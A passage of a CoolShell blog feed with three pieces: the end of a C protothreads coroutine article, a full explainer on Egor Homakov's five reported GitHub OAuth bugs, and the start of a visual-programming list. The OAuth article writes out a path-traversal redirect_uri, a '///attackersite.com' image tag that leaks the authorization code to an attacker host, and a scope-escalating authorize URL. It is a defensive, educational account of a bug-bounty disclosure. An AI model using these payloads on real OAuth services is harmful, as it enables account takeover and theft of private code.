  PT_SEM_INIT(&amp;full, BUFSIZE);
  PT_SEM_INIT(&amp;mutex, 1);
  PT_INIT(&amp;pt_producer);
  PT_INIT(&amp;pt_consumer);
  PT_WAIT_THREAD(pt, producer(&amp;pt_producer) &amp; consumer(&amp;pt_consumer));
  PT_END(pt);
}</pre>
<p>源码包中的 example-buffer.c 包含了可运行的完整示例，我就不全部贴了。整体框架就是一个 asymmetric coroutines，包括一个主协程 driver_thread 和两个子协程 producer 和 consumer ，其实不用多说大家也懂的，代码非常清晰直观。我们完全可以通过单线程实现一个简单的事件处理需求，你可以任意添加数十万个协程，几乎不会引起任何额外的系统开销和资源占用。唯一需要留意的地方就是没有一个局部变量，因为 protothreads 是 stackless 的，但这不是问题，首先我们已经假定运行环境是单线程的，其次在一个简化的需求下也用不了多少“局部变量”。如果在协程出让时需要保存一些额外的状态量，像迭代生成器，只要数目和大小都是确定并且可控的话，自行扩展协程上下文结构体即可。</p>
<p>当然这不是说 protothreads 是万能的，它只是贡献了一种模型，你要使用它首先就得学会适应它。下面列举一些 protothreads 的使用限制：</p>
<ul>
<li>由于协程是stackless的，尽量不要使用局部变量，除非该变量对于协程状态是无关紧要的，同理可推，协程所在的代码是不可重入的。</li>
</ul>
<ul>
<li>如果协程使用 switch-case 原语封装的组件，那么禁止在实际应用中使用 switch-case 语句，除非用 GNU C 语法中的标签指针替代。</li>
</ul>
<ul>
<li>一个协程内部可以调用其它例程，比如库函数或系统调用，但必须保证该例程是非阻塞的，否则所在线程内的所有协程都将被阻塞。毕竟线程才是执行的最小单位，协程不过是按“时间片轮度”的例程而已。</li>
</ul>
<p>官网上还例举了更多<a title="http://dunkels.com/adam/pt/examples.html" href="http://dunkels.com/adam/pt/examples.html" target="_blank">实例</a>，都非常实用。另外，一个叫 Craig Graham 的工程师扩展了 pt.h，使得 protothreads 支持 sleep/wake/kill 等操作，文件在此 <a title="http://dunkels.com/adam/download/graham-pt.h" href="http://dunkels.com/adam/download/graham-pt.h" target="_blank">graham-pt.h</a>。</p>
<h4>
<span class="ez-toc-section" id="%E5%8D%8F%E7%A8%8B%E5%BA%93_DIY_%E6%94%BB%E7%95%A5"></span>协程库 DIY 攻略<span class="ez-toc-section-end"></span>
</h4>
<p>看到这里，手养的你是否想迫不及待地 DIY 一个协程组件呢？哪怕很多动态语言本身已经支持了协程语义，很多 C 程序员仍然倾向于自己实现组件，网上很多开源代码底层用的主要还是 glibc 的 ucontext 组件，毕竟提供堆栈的协程组件使用起来更加通用方便。你可以自己写一个调度器，然后模拟线程上下文，再然后……你就能搞出一个跨平台的COS了（笑）。GNU Pth 线程库就是这么实现的，其原作者德国人 <a title="http://engelschall.com/" href="https://engelschall.com/" target="_blank">Ralf S. Engelschall</a> （又是个开源大牛，还写了 <a title="http://engelschall.com/software-artist.php" href="https://engelschall.com/software-artist.php" target="_blank">OpenSSL 等许多作品</a>）就写了一篇<a title="http://xmailserver.org/rse-pmt.pdf" href="http://xmailserver.org/rse-pmt.pdf" target="_blank">论文</a>教大家如何实现一个线程库。另外 protothreads 官网上也有一大堆<a title="http://dunkels.com/adam/pt/links.html" href="http://dunkels.com/adam/pt/links.html" target="_blank">推荐阅读</a>。Have fun！</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-01-28T10:50:41+08:00</pubDate>
<guid>https://coolshell.cn/articles/10975.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 从“黑掉Github”学Web安全开发 ]]></title>
<link>https://coolshell.cn/articles/11021.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >Egor Homakov（Twitter: <a href="https://twitter.com/homakov">@homakov</a> 个人网站: <a href="http://egorhomakov.com/">EgorHomakov.com</a>）是一个Web安全的布道士，他这两天把github给黑了，并给github报了5个安全方面的bug，他在他的这篇blog——《<a href="https://homakov.blogspot.com/2014/02/how-i-hacked-github-again.html" target="_blank">How I hacked Github again</a>》（墙）说明了这5个安全bug以及他把github黑掉的思路。Egor的这篇文章讲得比较简单，很多地方一笔带过，所以，<strong>我在这里用我的语言给大家阐述一下黑掉Github的思路以及原文中所提到的那5个bug。希望这篇文章能让从事Web开发的同学们警惕</strong>。关于Web开发中的安全事项，大家可以看看这篇文章《<a title="Web开发中需要了解的东西" href="https://coolshell.cn/articles/6043.html" target="_blank">Web开发中的你需要了解的东西</a>》</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#OAuth%E7%AE%80%E4%BB%8B" title="OAuth简介">OAuth简介</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#OAuth%E7%9A%84Callback" title="OAuth的Callback">OAuth的Callback</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E7%AC%AC%E4%B8%80%E4%B8%AABug_-_%E6%B2%A1%E6%9C%89%E6%A3%80%E6%9F%A5%E9%87%8D%E5%AE%9A%E5%90%91URL%E4%B8%AD%E7%9A%84" title="第一个Bug — 没有检查重定向URL中的/../">第一个Bug — 没有检查重定向URL中的/../</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E7%AC%AC%E4%BA%8C%E4%B8%AABUG_-_%E6%B2%A1%E6%9C%89%E6%A0%A1%E9%AA%8Ctoken" title="第二个BUG — 没有校验token">第二个BUG — 没有校验token</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-5" href="#%E7%AC%AC%E4%B8%89%E4%B8%AABUG_-_%E6%B3%A8%E5%85%A5%E8%B7%A8%E7%AB%99%E5%9B%BE%E7%89%87" title="第三个BUG — 注入跨站图片">第三个BUG — 注入跨站图片</a><ul class="ez-toc-list-level-5"><li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-6" href="#%E5%83%8F%E7%A8%8B%E5%BA%8F%E5%91%98%E4%B8%80%E6%A0%B7%E7%9A%84%E6%80%9D%E8%80%83" title="像程序员一样的思考">像程序员一样的思考</a></li></ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E7%AC%AC%E5%9B%9B%E4%B8%AAbug_-_Gist%E6%8A%8Agithub_token%E6%94%BE%E5%9C%A8%E4%BA%86cookie%E9%87%8C" title="第四个bug – Gist把github_token放在了cookie里">第四个bug – Gist把github_token放在了cookie里</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E7%AC%AC%E4%BA%94%E4%B8%AABug_-_%E8%87%AA%E5%8A%A8%E7%BB%99gist%E6%8E%88%E6%9D%83" title="第五个Bug – 自动给gist授权">第五个Bug – 自动给gist授权</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#_%E5%85%B6%E5%AE%83_%E6%84%9F%E6%83%B3" title=" 其它 &amp; 感想"> 其它 &amp; 感想</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="OAuth%E7%AE%80%E4%BB%8B"></span>OAuth简介<span class="ez-toc-section-end"></span>
</h4>
<p>首先，这个故事要从<a href="https://developer.github.com/v3/oauth/" target="_blank">Github OAuth</a>讲起。所以，我们需要先知道什么是<a href="https://en.wikipedia.org/wiki/OAuth" target="_blank">OAuth</a>。所谓OAuth就是说，第三方的应用可以通过你的授权而不用知道你的帐号密码能够访问你在某网站的你自己的数据或功能。像Google, Facebook, Twitter等网站都提供了OAuth服务，提供OAuth服务的网站一般都有很多开放的API，第三方应用会调用这些API来开发他们的应用以让用户拥有更多的功能，但是，当用户在使用这些第三方应用的时候，这些第三方的应用会来访问用户的帐户内的功能和数据，所以，当第三应用要干这些事的时候，我们不能让第三方应用弹出一个对话框来问用户要他的帐号密码，不然第三方的应用就把用户的密码给获取了，所以，OAuth协议会跳转到一个页面，让用户授权给这个第三方应用以某些权限，然后，这个权限授权的记录保存在Google/Facebook/Twitter上，并向第三方应用返回一个授权token，于是第三方的应用通过这个token来操作某用户帐号的功能和数据时，就畅通无阻了。下图简单地说明了Twitter的OAuth的授权过程。</p>
<p><span id="more-11021"></span></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">从上面的流程图中，我们可以看OAuth不管是1.0还是2.0版本都是一个比较复杂的协议，所以，在Server端要把OAuth实现对并不是一些容易事，其总是或多或少会有些小错误。Egor就找到了几个Github的OAuth的实现的问题。</p>
<h4 style="text-align: left;">
<span class="ez-toc-section" id="OAuth%E7%9A%84Callback"></span>OAuth的Callback<span class="ez-toc-section-end"></span>
</h4>
<p>还需要注意的是，因为OAuth是需要跳到主站的网页上去让用户授权，当用户授权完后，需要跳转回原网页，所以，一般来说，OAuth授权页都会带一个 redirect_url的参数，用于指定跳转回原来的网页。Github使用的这个跳转参数是redirect_uri参数。一般来说，redirect_uri这个参数需要在服务器端进行验证。</p>
<p>你想一下，如果有人可以控制这个redirect_uri这个参数，那么，你就可以让其跳转到别的网页上（可能会是个有恶意的网页）。如果你觉得跳转到别的网页上也无所谓，那么你就错了。别忘了，当你对这个第三方的应用授权通过后，服务方会给第三方应用返回一个授权token，这个token会被加到那个redirect_uri参数后面然后跳转回去，如果这个redirect_uri被别有用心的人改一个恶意的网址后，这个token也就被转过去了，于是授权token也就被泄漏过去了。</p>
<p>知道了这一切，我们就可以理解Egor提的那5个bug是什么意思了。</p>
<h4>
<span class="ez-toc-section" id="%E7%AC%AC%E4%B8%80%E4%B8%AABug_-_%E6%B2%A1%E6%9C%89%E6%A3%80%E6%9F%A5%E9%87%8D%E5%AE%9A%E5%90%91URL%E4%B8%AD%E7%9A%84"></span>第一个Bug — 没有检查重定向URL中的/../<span class="ez-toc-section-end"></span>
</h4>
<p>首先，我们通过<a href="https://developer.github.com/v3/oauth/#redirect-urls" target="_blank">Github的 redirect_uri 的说明文档</a>我们可以看到这样的说明：</p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">如果 CALLBACK URL是: http://example.com/path

GOOD: https://example.com/path
GOOD: http://example.com/path/subdir/other

BAD: http://example.com/bar
BAD: http://example.com/
BAD: http://example.com:8080/path
BAD: http://oauth.example.com:8080/path
BAD: http://example.org</pre>
<p>而Github对于redirect_uri做了限制，要求只能跳回到 https://gist.github.com/auth/github/callback/，也就是说，域名是gist.github.com，目录是/auth/github/callback/，服务器端做了这个限制，看似很安全了。</p>
<p>但是，Egor发现，Github的服务器端并没有验证.. /../../这样的情况。</p>
<p>于是，Egor相当于构造了一个下面这样的Redirect URL：</p>
<pre style="font-size: 10pt;">https://gist.github.com/auth/github/callback/../../../homakov/8820324?code=CODE</pre>
<p>于是上面的URL就相当于：</p>
<pre style="font-size: 10pt;">https://gist.github.com/homakov/8820324?code=CODE</pre>
<p>你可以看到，认证后的跳转网页转到了别的地方去（并非是github限制的地方）——我们知道Github的gist虽然是给你分享代码片段的，但是也可以用来定制自己的东西的（比如markdown），这个gist的网页当然是被Egor所控制的。</p>
<h4>
<span class="ez-toc-section" id="%E7%AC%AC%E4%BA%8C%E4%B8%AABUG_-_%E6%B2%A1%E6%9C%89%E6%A0%A1%E9%AA%8Ctoken"></span>第二个BUG — 没有校验token<span class="ez-toc-section-end"></span>
</h4>
<p>第一个bug其实并没有什么，如果服务器端要校验一下token是否和之前生成的token的redirect_uri一模一样，只要服务器做了这个验证，第一个bug完全没有什么用处，但是，github的服务端并没有验证。</p>
<p>这就是第二个bug，于是第一个和第二个bug组合起来成了一个相当有威力的安全漏洞。</p>
<p>也就是说，token的生成要考虑redirect_uri，这样，当URL跳转的时候，会把redirect_uri和token带到跳转页面（这里的跳转页面还是github自己的），跳转页面的服务端程序要用redirect_uri来生成一个token，看看是不是和传来的token是一个样的。这就是所谓的对URL进行签名——以保证URL的不被人篡改。一般来说，对URL签名和对签名验证的因子包括，源IP，服务器时间截，session，或是再加个salt什么的。</p>
<h4>
<span class="ez-toc-section" id="%E7%AC%AC%E4%B8%89%E4%B8%AABUG_-_%E6%B3%A8%E5%85%A5%E8%B7%A8%E7%AB%99%E5%9B%BE%E7%89%87"></span>第三个BUG — 注入跨站图片<span class="ez-toc-section-end"></span>
</h4>
<p>现在，redirect_uri带着code，安全顺利地跳到了Egor构造的网页上：</p>
<pre>https://gist.github.com/homakov/8820324?code=CODE</pre>
<p>但是，这个是gist的网页，你无法在这个页面上运行前端（Javascript）或后端程序（Ruby——Github是Ruby做的），现在的问题是我们怎么得到那个code，因为那个code虽然后带到了我的网页上来，但那个网页还是github和用户自己的环境。</p>
<p>到这里，一般来说，黑客会在这个页面上放一个诸如下面的一个链接，来引诱用户点击，：</p>
<p>&lt;a href=http://hack.you.com/&gt;私人照片&lt;/a&gt;</p>
<p>这样，当页面跳转到黑客的网站上来后，你之前的网页上的网址会被加在http头里的 Refere 参数里，这样，我就可以得到你的token了。</p>
<p>但是，在gist上放个链接还要用户去点一下，这个太影响“用户体验”了，最好能嵌入点外部的东西。gist上可以嵌入外站的图片，但是github的开发人员并非等闲之辈，对于外站的图片，其统统会把这些图片的url代理成github自己的url，所以，你很难搞定。</p>
<p>不过，我们可以用一个很诡异的技巧：</p>
<p style="text-align: center;"><b>&lt;img src=”///attackersite.com”&gt;</b></p>
<p>这个是什么玩意？这个是个URL的相对路径。但是为什么会有三个///呢？呵呵。</p>
<h5>
<span class="ez-toc-section" id="%E5%83%8F%E7%A8%8B%E5%BA%8F%E5%91%98%E4%B8%80%E6%A0%B7%E7%9A%84%E6%80%9D%E8%80%83"></span>像程序员一样的思考<span class="ez-toc-section-end"></span>
</h5>
<p>这个时候，我们需要以“程序员的编程思维”来思考问题——如果你是程序员，你会怎么写校验URL的程序？你一定会想到使用正则表达式，或是用程序来匹配URL中的一些pattern。于是，</p>
<ul>
<li>对于绝对路径：你会匹配两个//，后面的可能会是 <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="3f4a4c5a4d7f57504c4b115c5052">[email protected]</a>（<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="cdb8bea8bf8d">[email protected]</a>是可选的），然后可能会有:&lt;n&gt;端口号，然后是/，后面是服务器的路径，再往后面应该是?后面带一些参数了。</li>
</ul>
<ul>
<li>对于相对路径：就没有绝对路径那么复杂了。就是些 .. 和 /再加上?和一些参数。</li>
</ul>
<p>好了，如果coolshell.cn网页中的&lt;img src=&gt;或&lt;a href=&gt;中用到的相对路径是 /host.com，那么浏览器会解释成：https://coolshell.cn/host.com，如果是///host.com，那么就应该被浏览器解释成 https://coolshell.cn///host.com。</p>
<p>但是，Chrome和Firefox，会把///host.com当成绝对路径，因为其正确匹配了绝对路径的scheme。如果你正在用Chrome/Firefox看这篇文章 ，你可以看看下面的连接（源码如下）：</p>
<p style="text-align: center;"><a href="///www.google.com" target="_blank">CoolShell Test</a></p>
<p><code data-enlighter-language="html" class="EnlighterJSRAW">&lt;a href="///www.google.com"&gt;CoolShell Test&lt;/a&gt;</code></p>
<p>关键是，这个Chrome/Firefox的问题被标记成了Won’t Fix，我勒个去，基本上来说，后台的程序也有可能有这样的问题，对于Perl，Python，Ruby，Node.js，PHP带的URL检查的函数库都有这样的问题。</p>
<p>于是，我们就可以使用这样的方式给gist注入了一个第三方站点的图片（github的服务端没有察觉到（因为我们前面说过大多数语言的URL检查库都会被 Bypass了），但是浏览器端把这个链接解释到了第三方的站点上），于是请求这个图片的http头中的refere 中包含用户当前页面的URL，也包含了用户授权的code。</p>
<p>到这里，黑客Egor已经拿到用户gist的权限并可以修改或查看用户私用的gist了。但是作者并没有满足，他想要的更多。</p>
<h4>
<span class="ez-toc-section" id="%E7%AC%AC%E5%9B%9B%E4%B8%AAbug_-_Gist%E6%8A%8Agithub_token%E6%94%BE%E5%9C%A8%E4%BA%86cookie%E9%87%8C"></span>第四个bug – Gist把github_token放在了cookie里<span class="ez-toc-section-end"></span>
</h4>
<p>于是Egor在用户的cookie里找到了 github_token</p>
<p><img alt="image placeholder" ></p>
<p>但是这个token没什么用，因为授权的Scope只有gists。但是，这个token不应该放在用户端的cookie里，本身就是一个安全事故，这个东西只能放在服务端（关于Web开发中的安全事项，可以看看这篇文章《<a title="Web开发中需要了解的东西" href="https://coolshell.cn/articles/6043.html" target="_blank">Web开发中的你需要了解的东西</a>》）。</p>
<p>于是，Egor只能另谋出路。</p>
<h4>
<span class="ez-toc-section" id="%E7%AC%AC%E4%BA%94%E4%B8%AABug_-_%E8%87%AA%E5%8A%A8%E7%BB%99gist%E6%8E%88%E6%9D%83"></span>第五个Bug – 自动给gist授权<span class="ez-toc-section-end"></span>
</h4>
<p>因为gist是github自家的，Egor所以估计github想做得简单一点，当用户访问gist的时候，不会出弹出一个OAuth的页面来让用户授权，不然，用户就会很诧异，都是你们自家的东西，还要授权？所以，Egor猜测github应该是对gist做了自动授权，于是，Egor搞了这样的一个URL（注意其中的 redirect_uri中的scope ）</p>
<p style="word-wrap: break-word; padding: 10px 20px 20px 30px; background-color: #eee;">https://github.com/login/oauth/authorize?client_id=7e0a3cd836d3e544dbd9&amp;redirect_uri=https%3A%2F%2Fgist.github.com%2Fauth%2Fgithub%<b>2Fcallback/../../../homakov/8820324</b>&amp;response_type=code&amp;<b>scope=repo,gists,user,delete_repo,notifications</b></p>
<p>于是，这个redirect-uri不但帮黑客拿到了访问gist的token，而且还把授权token的scope扩大到了用户的代码库等其它权限。于是你就可以黑入用户的私有代码区了。</p>
<h4>
<span class="ez-toc-section" id="_%E5%85%B6%E5%AE%83_%E6%84%9F%E6%83%B3"></span> 其它 &amp; 感想<span class="ez-toc-section-end"></span>
</h4>
<p>于是，作者从 <a href="https://bounty.github.com/">Github Security Bug Bounty</a> 拿到了USD $4,000的奖励！Egor一共花了从下午2点到6点一共4个小时找到了这些Bug，平均一小时1000美刀。Egor还很得瑟的说，如果Github请他做安全顾问，他只收一小时USD $400刀，这4个小时也就$1,600。呵呵。大家看看，这是多么有效率的赚钱方式。</p>
<p>下图是Github上的赏金猎手的排行榜（<a href="https://bounty.github.com/index.html#leaderboard" target="_blank">https://bounty.github.com/index.html#leaderboard</a>）你可以上去挨个看看他们找到的问题，你会发现好些安全问题都很小，有些只能说是不是很规范的问题，Github都赏了几百刀。我查看了一下github的赏金政策，github赏金至少100刀，到5000刀不等。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>让我们扪心自问一下，我们花了多少时间在玩那些“红包游戏”，而又搞到了多少红包？人家4个小时找了5个bug，挣了$4000美金。<strong>老天给了你我一样的时间，我们用来抽几块钱的红包，人家用自己的技能来挣奖金。这就是人和人的差距。这就是所谓的效率</strong>——你可以移步看看我写的《<a title="加班与效率" href="https://coolshell.cn/articles/10217.html" target="_blank">加班与效率</a>》</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-02-10T08:16:11+08:00</pubDate>
<guid>https://coolshell.cn/articles/11021.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 可视化编程 ]]></title>
<link>https://coolshell.cn/articles/11094.html</link>
<content><![CDATA[ 
<p>本文来自《<a href="http://blog.interfacevision.com/design/design-visual-progarmming-languages-snapshots/" target="_blank">Visual Programming Languages – Snapshots</a>》，作者<a href="https://twitter.com/erichosick" target="_blank">Eric Hosick</a>收集了一堆关于可视化编程的工具，好多我都听都没听说过，我一股脑的全转过来，给大家看看，算是开开眼界了。<span style="line-height: 1.5em;">本文也是参考了Wikipedia的 </span><a style="line-height: 1.5em;" href="https://en.wikipedia.org/wiki/Visual_programming_language">Visual Programming Language</a> 词条。</p>
<p>另外，在原文有很多评论，其中也有很多正文没有提到的，你可以前去围观一下。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#SketchPad" title="SketchPad">SketchPad</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#Alice" title="Alice">Alice</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#App_Inventor_For_Android" title="App Inventor For Android">App Inventor For Android</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#ArcGIS_Model_Builder" title="ArcGIS Model Builder">ArcGIS Model Builder</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#Automator" title="Automator">Automator</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#Blockly" title="Blockly">Blockly</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#Bounce" title="Bounce">Bounce</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#Copper_Thoughts" title="Copper Thoughts">Copper Thoughts</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#DRAKON" title="DRAKON">DRAKON</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#Etoys_Squeak" title="Etoys / Squeak">Etoys / Squeak</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-11" href="#Field" title="Field">Field</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-12" href="#FL_Studio" title="FL Studio">FL Studio</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-13" href="#Flow_Hub_and_NoFlo" title="Flow Hub and NoFlo">Flow Hub and NoFlo</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-14" href="#FlowStone" title="FlowStone">FlowStone</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-15" href="#GoDot_Engine" title="GoDot Engine">GoDot Engine</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-16" href="#Google_Web_Designer" title="Google Web Designer">Google Web Designer</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-17" href="#Hopscotch" title="Hopscotch">Hopscotch</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-18" href="#HyperCard" title="HyperCard">HyperCard</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-19" href="#IFTTT" title="IFTTT">IFTTT</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-20" href="#Illumination_Software_Creator" title="Illumination Software Creator">Illumination Software Creator</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-21" href="#Intentional_Technology" title="Intentional Technology">Intentional Technology</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-22" href="#Jeskola_Buzz" title="Jeskola Buzz">Jeskola Buzz</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-23" href="#Kimono" title="Kimono">Kimono</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-24" href="#Kodu_Boku" title="Kodu (Boku)">Kodu (Boku)</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-25" href="#LabView" title="LabView">LabView</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-26" href="#Ladder_Logic" title="Ladder Logic">Ladder Logic</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-27" href="#Lamdu" title="Lamdu">Lamdu</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-28" href="#Lava" title="Lava">Lava</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-29" href="#Learnable_Programming" title="Learnable Programming">Learnable Programming</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-30" href="#Light_Table" title="Light Table">Light Table</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-31" href="#Lily" title="Lily">Lily</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-32" href="#Limnor_Studio" title="Limnor Studio">Limnor Studio</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-33" href="#Little_Big_Planet" title="Little Big Planet">Little Big Planet</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-34" href="#Minecraft" title="Minecraft">Minecraft</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-35" href="#Minibloq" title="Minibloq">Minibloq</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-36" href="#Morphic" title="Morphic">Morphic</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-37" href="#Mozilla_Appmaker" title="Mozilla Appmaker">Mozilla Appmaker</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-38" href="#MST_Workshop" title="MST Workshop">MST Workshop</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-39" href="#NeatTools_Visual_Programming_Environment" title="NeatTools Visual Programming Environment">NeatTools Visual Programming Environment</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-40" href="#NodeBox" title="NodeBox">NodeBox</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-41" href="#Nuke" title="Nuke">Nuke</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-42" href="#NXT-G" title="NXT-G">NXT-G</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-43" href="#Open_Modelica" title="Open Modelica">Open Modelica</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-44" href="#Open_Music" title="Open Music">Open Music</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-45" href="#OpenWire" title="OpenWire">OpenWire</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-46" href="#Origami" title="Origami">Origami</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-47" href="#Piet" title="Piet">Piet</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-48" href="#Programming_Without_Coding_Technology" title="Programming Without Coding Technology">Programming Without Coding Technology</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-49" href="#Prograph" title="Prograph">Prograph</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-50" href="#Pure_Data" title="Pure Data">Pure Data</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-51" href="#Quartz_Composer" title="Quartz Composer">Quartz Composer</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-52" href="#Reaktor" title="Reaktor">Reaktor</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-53" href="#Scheme_Bricks" title="Scheme Bricks">Scheme Bricks</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-54" href="#Scratch" title="Scratch">Scratch</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-55" href="#Self" title="Self">Self</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-56" href="#Sextante" title="Sextante">Sextante</a></li>
